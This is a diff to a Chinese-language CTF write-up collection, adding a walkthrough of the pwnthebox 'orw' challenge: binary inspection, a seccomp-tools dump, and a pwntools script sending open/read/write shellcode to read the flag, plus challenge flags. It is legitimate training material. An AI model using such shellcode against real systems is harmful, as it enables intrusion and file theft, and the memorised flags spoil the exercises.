@@ -3294,7 +3294,7 @@ io.interactive()
 
 > 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！
 
-直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。
+直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限失败。利用`alpha3`进行编码生成一段没有坏字符的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。
 
 ```python
 from pwn import *
@@ -3305,7 +3305,114 @@ io.send(shellcode)
 io.interactive()
 ```
 
+------
 
+### [orw](https://ce.pwnthebox.com/challenges?id=1688)
+
+先`file ./orw `查看文件类型，再`checksec --file=./orw `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./orw
+./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
+                                                                                                                          
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./orw
+[*] '/home/tyd/ctf/pwn/pwnthebox/orw'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+使用`IDA pro 32bit`打开附件`orw`，按`F5`反汇编源码并查看主函数：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf("Give my your shellcode:");
+  read(0, &shellcode, 0xC8u);
+  ((void (*)(void))shellcode)();
+  return 0;
+}
+```
+
+双击`orw_seccomp()`函数，详情如下：
+
+```c
+unsigned int orw_seccomp()
+{
+  __int16 v1; // [esp+4h] [ebp-84h] BYREF
+  char *v2; // [esp+8h] [ebp-80h]
+  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
+  unsigned int v4; // [esp+6Ch] [ebp-1Ch]
+
+  v4 = __readgsdword(0x14u);
+  qmemcpy(v3, &unk_8048640, sizeof(v3));
+  v1 = 12;
+  v2 = v3;
+  prctl(38, 1, 0, 0, 0);
+  prctl(22, 2, &v1);
+  return __readgsdword(0x14u) ^ v4;
+}
+```
+
+`prctl(38, 1, 0, 0, 0);`表示禁止提权，比如`system`和`onegadget`都不能用了。`prctl(22, 2, &v1);`限制了能执行系统调用的函数。`seccomp`是`Linux`系统的一种安全机制，主要功能是限制直接通过`syscall`去调用某些系统函数。我们可以用`seccomp-tools`去分析程序的`seccomp`状态。
+
+```bash
+sudo gem install seccomp-tools
+```
+
+通过`seccomp-tools`发现可以使用`open`，`read`，`write`这三个函数。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ seccomp-tools dump ./orw
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
+ 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
+ 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
+ 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
+ 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
+ 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
+ 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+返回主函数，双击`shellcode`变量跳转到`.bss`段，`shellcode`直接写入到起始地址为`0x804A060`的`.bss`段。
+
+```assembly
+.bss:0804A060                 public shellcode
+.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p
+......
+.bss:0804A127 _bss            ends
+```
+
+`open`打开`flag`文件，`read`读取`flag`中的文件到`esp`寄存器中，`write`将`esp`中`flag`文件内容写入到标准输出中进行输出显示。编写`Python`代码连接`redirect.do-not-trust.hacking.run`的监听端口`10119`，发送`shellcode`可得`PTB{921a8cae-fd37-403e-b86e-f0fccd06e17f}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10119)
+bss_addr = 0x804A060
+shellcode = shellcraft.open('flag')
+shellcode += shellcraft.read('eax', 'esp', 0x100)
+shellcode += shellcraft.write(1, 'esp', 0x100)
+shellcode += shellcraft.exit(0)
+io.sendline(asm(shellcode))
+io.interactive()
+```
+
+------
 
 ## Pwnable.kr
 
